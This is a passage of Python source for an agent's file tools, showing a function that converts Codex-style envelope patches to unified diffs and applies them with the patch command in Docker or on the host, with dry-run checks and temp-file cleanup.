            current_path = raw.split(":", 1)[1].strip()
            current_op = "delete"
            continue
        if current_path is not None:
            body.append(raw)
    flush()

    if not out_chunks:
        return None
    return "".join(out_chunks)


def apply_patch(
    patch_content: str,
    filepath: Optional[str] = None,
    cwd: Optional[str] = None,
    use_docker: bool = True,
) -> bool:
    """Apply a patch to one or more files.

    Args:
        patch_content: Unified diff or content to append.
        filepath: Specific file to patch. If None, assumes the unified
            diff carries its own paths.
        cwd: Working directory.
        use_docker: Whether to run in Docker.

    Returns:
        The success status.
    """
    if not patch_content:
        return False

    # Transparently convert Codex/Aider "*** Begin Patch" envelope patches
    # (frequently emitted by the fixer LLM) into a standard unified diff
    # before the format check. Without this, every envelope patch is rejected
    # with "not a valid unified diff" and the fix never lands.
    converted = _convert_codex_envelope_to_unified_diff(patch_content)
    if converted is not None:
        logger.info("Converted Codex envelope patch to unified diff")
        patch_content = converted
        # An envelope patch always specifies its own paths, so applying with
        # patch -p1 from cwd is the correct strategy — drop any caller-supplied
        # filepath so we don't double-route the diff.
        if filepath:
            filepath = None

    if use_docker:
        # Write patch to container's /tmp
        import uuid

        patch_filename = f"/tmp/agent_{uuid.uuid4().hex[:8]}.patch"
        if not write_file(patch_filename, patch_content, use_docker=True):
            return False

        try:
            import shlex

            quoted_fp = shlex.quote(filepath) if filepath else ""
            if filepath:
                # Apply to a specific file - always try as a diff,
                # never raw append.
                if "--- " in patch_content and "+++ " in patch_content:
                    cmd = f"patch {quoted_fp} < {patch_filename}"
                elif "@@ " in patch_content:
                    # Has diff hunks but missing headers - try patch -p0
                    cmd = f"patch -p0 {quoted_fp} < {patch_filename}"
                else:
                    # Not a valid diff format - reject to avoid
                    # corrupting the file.
                    logger.warning(
                        "Patch content is not a valid unified diff - "
                        "rejecting to avoid file corruption"
                    )
                    return False
            else:
                # Standard unified diff - apply with -p1
                # Try dry-run first
                dry_run = execute_command(
                    f"patch -p1 --dry-run < {patch_filename}",
                    cwd=cwd,
                    use_docker=True,
                )
                if not dry_run.success:
                    logger.warning(f"Patch dry-run failed: {dry_run.stderr}")
                    # Try p0 as fallback
                    dry_run = execute_command(
                        f"patch -p0 --dry-run < {patch_filename}",
                        cwd=cwd,
                        use_docker=True,
                    )
                    if not dry_run.success:
                        return False
                    cmd = f"patch -p0 < {patch_filename}"
                else:
                    cmd = f"patch -p1 < {patch_filename}"

            result = execute_command(cmd, cwd=cwd, use_docker=True)
            return result.success
        finally:
            execute_command(f"rm {patch_filename}", use_docker=True)
    else:
        # Non-docker implementation (for local testing/setup)
        try:
            import tempfile

            with tempfile.NamedTemporaryFile(
                mode="w", delete=False, suffix=".patch"
            ) as f:
                f.write(patch_content)
                patch_file = f.name

            # From here on the temp file exists on disk; remove it on
            # every path (including the invalid-diff rejection and any
            # unexpected exception) so failed patches don't litter /tmp.
            try:
                if filepath:
                    if "--- " in patch_content and "+++ " in patch_content:
                        cmd = f"patch {filepath} < {patch_file}"
                    elif "@@ " in patch_content:
                        cmd = f"patch -p0 {filepath} < {patch_file}"
                    else:
                        logger.warning(
                            "Patch content is not a valid unified diff - "
                            "rejecting"
                        )
                        return False
                else:
                    cmd = f"patch -p1 < {patch_file}"

                result = execute_command(cmd, cwd=cwd, use_docker=False)
                return result.success
            finally:
                try:
                    os.remove(patch_file)
                except OSError:
                    pass
        except Exception as e:
            logger.error(f"Failed to apply patch on host: {e}")
            return False


# Export all functions
__all__ = [
    "execute_command",
    "read_file",
    "write_file",
    "file_exists",
    "apply_patch",
    "CommandValidator",
    "DockerConfig",
]
